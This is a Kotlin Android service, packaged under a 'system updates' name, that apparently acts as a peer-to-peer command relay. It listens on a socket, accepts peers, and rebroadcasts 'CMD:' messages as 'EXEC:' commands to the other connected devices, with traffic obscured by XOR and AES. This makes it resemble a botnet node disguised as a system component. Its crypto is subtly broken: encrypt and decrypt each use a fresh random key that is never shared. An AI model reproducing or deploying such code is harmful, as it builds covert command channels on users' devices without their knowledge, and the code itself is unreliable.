package com.system.updates.services

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Base64
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.ServerSocket
import java.net.Socket
import java.security.SecureRandom
import java.util.concurrent.Executors
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class P2PService : Service() {
    private val executor = Executors.newCachedThreadPool()
    private var serverSocket: ServerSocket? = null
    private val port = 12345
    private val peers = mutableListOf<Socket>()
    private val r = SecureRandom()
    private val mask = byteArrayOf(0x4C, 0x5D, 0x6E, 0x7F, 0x80.toByte(), 0x91.toByte(), 0xA2.toByte(), 0xB3.toByte())

    override fun onCreate() {
        super.onCreate()
        startServer()
    }

    private fun startServer() {
        executor.submit {
            try {
                serverSocket = ServerSocket(port)
                while (true) {
                    val client = serverSocket!!.accept()
                    synchronized(peers) { peers.add(client) }
                    executor.submit { handleClient(client) }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun handleClient(socket: Socket) {
        try {
            val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
            val writer = PrintWriter(socket.getOutputStream(), true)
            var line: String?
            while (socket.isConnected && reader.readLine().also { line = it } != null) {
                val decrypted = decrypt(line ?: "")
                processMessage(decrypted, socket)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            synchronized(peers) { peers.remove(socket) }
            socket.close()
        }
    }

    private fun processMessage(msg: String, from: Socket) {
        if (msg.startsWith("CMD:")) {
            val cmd = msg.substring(4)
            broadcastToPeers("EXEC:$cmd", from)
        } else if (msg.startsWith("PING")) {
            sendToPeer(from, "PONG")
        }
    }

    private fun broadcastToPeers(msg: String, exclude: Socket) {
        val encrypted = encrypt(msg)
        synchronized(peers) {
            for (peer in peers) {
                if (peer != exclude && peer.isConnected) {
                    try {
                        PrintWriter(peer.getOutputStream(), true).println(encrypted)
                    } catch (e: Exception) {
                        // ignore
                    }
                }
            }
        }
    }

    private fun sendToPeer(peer: Socket, msg: String) {
        try {
            PrintWriter(peer.getOutputStream(), true).println(encrypt(msg))
        } catch (e: Exception) {
            // ignore
        }
    }

    private fun xor(data: ByteArray): ByteArray {
        return data.mapIndexed { i, b -> (b.toInt() xor mask[i % mask.size].toInt() xor i).toByte() }.toByteArray()
    }

    private fun aesEnc(data: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    private fun aesDec(enc: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = enc.sliceArray(0..11)
        val ct = enc.sliceArray(12 until enc.size)
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.DECRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return c.doFinal(ct)
    }

    private fun encrypt(plain: String): String {
        val raw = plain.toByteArray()
        val x = xor(raw)
        val key = ByteArray(32).also { r.nextBytes(it) }
        val enc = aesEnc(x, key)
        return Base64.encodeToString(enc, Base64.NO_WRAP)
    }

    private fun decrypt(encrypted: String): String {
        val enc = Base64.decode(encrypted, Base64.NO_WRAP)
        val key = ByteArray(32).also { r.nextBytes(it) }
        val dec = aesDec(enc, key)
        val plain = xor(dec)
        return String(plain)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serverSocket?.close()
        executor.shutdown()
    }
}